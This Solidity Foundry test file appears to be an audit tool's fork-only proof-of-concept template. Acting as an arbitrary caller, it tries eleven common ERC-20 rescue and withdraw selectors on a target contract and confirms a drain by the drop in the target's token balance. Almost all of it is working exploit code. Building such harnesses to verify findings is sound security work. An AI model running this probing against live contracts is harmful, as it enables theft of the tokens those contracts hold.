// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Token rescue drain (unprotected ERC-20 rescue)
/// @notice Detector: token-drain. A token-moving function has no access
///         check, so ANY caller can move the contract's ERC-20 balances
///         out (typically to a fixed recipient, e.g. a dev wallet).
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. The candidate token is POC_TOKEN when
///      set, otherwise the target itself (a token contract rescuing its
///      own token is the common field case). Tries the common rescue
///      selectors in turn; each attempt must reduce the target's balance
///      of the candidate token to count as proof (a rescue fn that
///      silently succeeds proves nothing). This is the token-side
///      sibling of 06-open-drain.t.sol, whose observable is ETH and so
///      cannot judge a token drain at all.

contract PoC is Test {
    address public target;
    address public token;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
        token = vm.envOr("POC_TOKEN", address(0));
        if (token == address(0)) token = target;
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
        assertGt(token.code.length, 0, "candidate token has no code at this fork block");
    }

    /// The target's balance of the candidate token, read low-level so a
    /// candidate with no balanceOf reads as zero (nothing to drain)
    /// instead of aborting the harness with a decode error.
    function _targetTokenBalance() internal view returns (uint256) {
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", target));
        if (!ok || ret.length < 32) return 0;
        return abi.decode(ret, (uint256));
    }

    /// Try each plausible entry point and accept the first that changes
    /// the OBSERVABLE -- never the first that returns. A no-op or
    /// already-guarded function returns successfully and changes
    /// nothing, so judging by the call result reports "not reproduced"
    /// for a vulnerability that exists under another name.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (ok && _targetTokenBalance() < before) return label;
        return "";
    }

    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        used = _attempt(
            attacker,
            before,
            "rescueERC20(address,uint256)",
            abi.encodeWithSignature("rescueERC20(address,uint256)", token, before)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "rescueToken(address,uint256)",
            abi.encodeWithSignature("rescueToken(address,uint256)", token, before)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "rescueTokens(address,uint256)",
            abi.encodeWithSignature("rescueTokens(address,uint256)", token, before)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "withdrawERC20(address,uint256)",
            abi.encodeWithSignature("withdrawERC20(address,uint256)", token, before)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "sweep(address,uint256)",
            abi.encodeWithSignature("sweep(address,uint256)", token, before)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "rescueERC20(address)",
            abi.encodeWithSignature("rescueERC20(address)", token)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "recoverERC20(address,uint256)",
            abi.encodeWithSignature("recoverERC20(address,uint256)", token, before)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "withdrawToken(address,uint256)",
            abi.encodeWithSignature("withdrawToken(address,uint256)", token, before)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "withdrawTokens(address,uint256)",
            abi.encodeWithSignature("withdrawTokens(address,uint256)", token, before)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "rescue(address,address,uint256)",
            abi.encodeWithSignature("rescue(address,address,uint256)", token, attacker, before)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "rescueTokens(address,address,uint256)",
            abi.encodeWithSignature("rescueTokens(address,address,uint256)", token, attacker, before)
        );
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        uint256 before = _targetTokenBalance();
        require(
            before > 0,
            "target holds none of the candidate token (POC_TOKEN when set, otherwise the target itself as its own token), so there is nothing to drain. This does NOT establish safety: the target may hold other tokens, or hold this one at another fork block -- set POC_TOKEN to a token the target actually holds and re-run."
        );

        string memory used = _tryEntry(attackerEOA, before);
        console.log("entry point that changed state:", used);

        uint256 afterBal = _targetTokenBalance();
        uint256 drained = before - afterBal;
        console.log("target token balance before:", before);
        console.log("target token balance after:", afterBal);
        assertGt(
            drained,
            0,
            "no token-rescue selector moved tokens out of the target. Tried rescueERC20(address,uint256), rescueToken(address,uint256), rescueTokens(address,uint256), withdrawERC20(address,uint256), sweep(address,uint256), rescueERC20(address), recoverERC20(address,uint256), withdrawToken(address,uint256), withdrawTokens(address,uint256), rescue(address,address,uint256), rescueTokens(address,address,uint256). This does NOT establish safety: the rescue may be guarded by an owner check, named differently, take other arguments, or be reachable only by a specific caller."
        );
    }
}
